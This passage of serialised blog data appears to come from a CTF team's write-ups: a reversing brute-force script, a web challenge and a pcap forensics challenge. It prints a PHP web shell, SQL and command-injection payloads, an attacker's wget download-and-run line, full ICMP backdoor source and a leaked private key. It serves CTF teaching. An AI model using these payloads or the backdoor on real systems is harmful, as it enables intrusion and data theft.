\"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\"def algo(a1, offset): result = \"\" v2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v3 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v4 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] for i in xrange(20): v4[i] = ord(a1[i]) for j in xrange(20,40): v3[j-20]= ord(a1[j]) for k in xrange(0,20): v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8 v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11 for l in xrange(0,20): v2[l] = v4[l] for m in xrange(20,40): v2[m] = v3[m-20] flag = ''.join([chr(x) for x in v2]) #print(flag) #print(correct) if(flag != correct): result = \"Wrong\" else: result = \"Correct\" return result, flag[offset] == correct[offset]def main(): v2 = 0 v4 = \"\" flag = \"\" # 0x20 v6 = '' v7 = 0 i = 0 result = 'Wrong' offset = 7 flag = \"h4ck1t&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;\" diff = False #print (string.printable) #exit(0) while result == 'Wrong': #print offset for y in string.printable: v4 = \"\" flag = [x for x in flag] #print offset flag[offset] = y #print('\\r'+''.join(flag),end='') i = 0 while True: v2 = i if (v2 &gt;= len(flag)): break v4 += flag[i] i +=1 #print (v4,offset) result, diff = algo(v4, offset) if result == 'Correct': break #print (diff,y) #print len(list(diff)) if diff: diff = False offset += 1 break print(''.join(flag), result)main() Easy isn’t it? running it we get the flag!: 12$ python rev200.pyh4ck1t&#123;ff77af3cf8d4e1e67c4300aeb5ba6344&#125; Correct","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"encryption","slug":"encryption","permalink":"https://teamrocketist.github.io/tags/encryption/"},{"name":"byte2byte","slug":"byte2byte","permalink":"https://teamrocketist.github.io/tags/byte2byte/"}]},{"title":"[Web] Hackit 2017 - V1rus3pidem1c 100","slug":"Web-Hackit-2017-V1rus3pidem1c-100","date":"2017-08-27T14:42:12.000Z","updated":"2017-08-27T20:18:33.098Z","comments":true,"path":"2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","excerpt":"","text":"V1rus3pidem1cweb100Wasted16Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13372Hint: (none) After interacting a little bit with the page we can start taking some notes about the website:123GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).File Upload form (By uploading a PHP Script). The uploaded files appear to be uploaded into uploads folder. Lets try uploading a php: 123&lt;?php&lt;pre&gt;if($_GET['cmd'])&#123;system($_GET['cmd']);&#125;&lt;/pre&gt;?&gt; Running some curl commands to check the status code of the file we are about to upload: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'404 We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/index.php?country=Germany' -F \"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php\"200 Nice we got an 200 (OK) response! lets see if see if this is good news: 12345678910$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'200$ curl 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'&lt;pre&gt;&lt;?phpif($_GET['cmd']) &#123; system($_GET['cmd']); &#125;?&gt;&lt;/pre&gt; We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it. Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this. But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection? 12345678910111213141516171819202122232425262728293031323334353637$ sqlmap -u \"http://tasks.ctf.com.ua:13372/index.php?country=USA\" --tables --threads=10 --exclude-sysdbs --dump---Parameter: country (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa---[16:51:04] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12Database: WHATAREYOUDOINGHERE[1 table]+-----------+| countries |+-----------+Database: WHATAREYOUDOINGHERETable: countries[10 entries]+-----------+----------------+--------------+| countryID | scriptPath | countryName |+-----------+----------------+--------------+| 1 | country/ge.php | Germany || 2 | country/tu.php | Turkmenistan || 3 | country/ne.php | Netherlands || 4 | country/se.php | Serbia || 5 | country/tk.php | Turkey || 6 | country/fr.php | France || 7 | country/uk.php | UK || 8 | country/ru.php | Russia || 9 | country/us.php | USA || 10 | country/ca.php | Canada |+-----------+----------------+--------------+ And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection! Getting the column number: 1234# successfully shows up a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 1-- qqq'# Doest show a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 2-- qqq' Performing union injection and include /etc/passwd: Including our previous uploaded php script and and get remote code execution on the server! 123456789101112$ curl \"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ\"\"truncated html code\"total 72drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads-r--r--r-- 1 1002 1002 49 Aug 27 07:36 .htaccessdrwxrwxr-x 5 1002 1002 4096 Aug 25 20:26 .-r--r--r-- 1 1002 1002 44 Aug 25 20:26 iulersiueruigfuihseruhgi.phpdrwxrwxr-x 4 1002 1002 4096 Aug 25 13:59 ..-r--r--r-- 1 1002 1002 1667 Jul 28 20:54 index.phpdrwxrwxr-x 2 1002 1002 4096 Jul 28 03:35 countrydrwxrwxr-x 2 1002 1002 4096 Jul 28 03:34 static\"truncated html code\" The flag was in the php file iulersiueruigfuihseruhgi.php: 12345678$ curl 'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'\"truncated html code\"&lt;pre&gt;&lt;?php$flag=\"h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;\";?&gt;&lt;/pre&gt;\"truncated html code\"","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"}]},{"title":"[Network] Sha2017 - Abuse Mail [300]","slug":"Network-Sha2017-Abuse-Mail-300","date":"2017-08-07T12:52:21.000Z","updated":"2017-08-10T02:49:22.370Z","comments":true,"path":"2017/08/07/Network-Sha2017-Abuse-Mail-300/","link":"","permalink":"https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/","excerpt":"","text":"Abuse Mail (300) - 62 solvesOur abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?abusemail.tgz233b7cb7f8113baca2f8d29d74105887 we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap. Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication. Let’s check telenet’s packages: Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -&gt; Preferences -&gt; Protocols -&gt; ESP After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to upload a backdoor on the server. the commands he used: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139GET /?ip=google.com HTTP/1.1PING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 msGET /?ip=google.com;ls HTTP/1.1ING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms--- google.com ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3005msrtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 mscssindex.phpGET /?ip=;ls%20-la HTTP/1.1total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpGET /?ip=;sudo%20-l HTTP/1.1Matching Defaults entries for www-data on router: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on router: (ALL : ALL) NOPASSWD: ALLGET /?ip=;id HTTP/1.1uid=33(www-data) gid=33(www-data) groups=33(www-data)GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1--2017-07-26 09:43:36-- http://10.5.5.207/backdoor.pyConnecting to 10.5.5.207:80... connected.HTTP request sent, awaiting response... 200 OKLength: 2428 (2.4K) [text/x-python]Saving to: '/tmp/backdoor.py'0K .. 100% 458M=0s2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]GET /?ip=;cat /tmp/backdoor.py HTTP/1.1#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: passGET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1 The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb “GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1”. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: pass With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse02.pcap -Tfields -e data | xxd -r -p &gt; encrypted1kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse03.pcap -Tfields -e data | xxd -r -p &gt; encrypted2 Now modifing the scrypt so we can decrypt our IMCP encrypted data: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i]) print outp Running the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pycommand:ls -lacommand:total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpcommand:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:ls -la /rootcommand:total 32drwx------ 5 root root 4096 Jul 27 07:27 .drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..-rw------- 1 root root 3228 Jul 26 06:44 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwxr-xr-x 2 root root 4096 Jul 27 09:11 certsdrwxr-xr-x 2 root root 4096 Jul 26 03:47 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jul 27 07:27 .sshcommand:ls -la /root/certscommand:total 16drwxr-xr-x 2 root root 4096 Jul 27 09:11 .drwx------ 5 root root 4096 Jul 27 07:27 ..-rw-r--r-- 1 root root 989 Jul 27 07:23 intranet.crt-rw-r--r-- 1 root root 916 Jul 27 07:23 intranet.keycommand:cat /root/certs/intranet.crtcommand:-----BEGIN CERTIFICATE-----MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==-----END CERTIFICATE-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /etc/hostscommand:127.0.0.1 localhost127.0.1.1 ubuntu# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters10.29.0.1 router192.168.1.1 router192.168.1.2 intranetcommand:nohup nmap intranet &gt; /tmp/intranet.nmapcommand:command:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:curl -k https://intranet/command: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 456 100 456 0 0 4871 0 --:--:-- --:--:-- --:--:-- 4903&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Unauthorized&lt;/h1&gt;&lt;p&gt;This server could not verify that youare authorized to access the documentrequested. Either you supplied the wrongcredentials (e.g., bad password), or yourbrowser doesn't understand how to supplythe credentials required.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 